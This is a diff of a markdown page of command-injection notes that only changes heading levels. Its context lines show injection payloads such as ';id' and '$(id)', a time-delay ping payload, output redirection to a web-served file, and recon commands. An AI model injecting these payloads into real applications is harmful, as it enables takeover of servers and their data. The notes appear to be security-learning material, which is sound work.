@@ -2,7 +2,7 @@
 title: Command Injection
 ---
 
-# Injecting OS Commands
+## Injecting OS Commands
 
 OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data. 
 
@@ -32,7 +32,7 @@ Final command:
 python3 stockreport.py & echo aiwefwlguh & 29
 ```
 
-## Typicall payloads
+### Typicall payloads
 
 ```
 ;id
@@ -45,7 +45,7 @@ $(id)
 \n id
 ```
 
-## Useful Commands
+### Useful Commands
 
 |   **Linux**   |  **Windows** | **Description**     |
 |:-------------:|:------------:|---------------------|
@@ -55,11 +55,11 @@ $(id)
 | netstat -tlpn | netstat -ano | Network connections |
 |     ps -ef    |   tasklist   | Processes           |
 
-# Blind Command Injection
+## Blind Command Injection
 
 Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required. 
 
-## Using Time Delays
+### Using Time Delays
 
 The `ping` command is a good way to exploit it because we can specify the number of ICMP packets to send. This enable us to control the time taken for the command to run.
 
@@ -67,7 +67,7 @@ The `ping` command is a good way to exploit it because we can specify the number
 & ping -c 10 127.0.0.1 &
 ```
 
-## Redirecting the output
+### Redirecting the output
 
 We can redirect the output from the injected command into a file.
 
@@ -81,7 +81,7 @@ Finally if we achieved to redirect the output to a directory which is available 
 https://example.com/whoami.txt
 ```
 
-## Out-of-band (OAST)
+### Out-of-band (OAST)
 
 We can trigger an out-of-band network interaction with a system we control such as ICMP, HTTP or DNS.
 
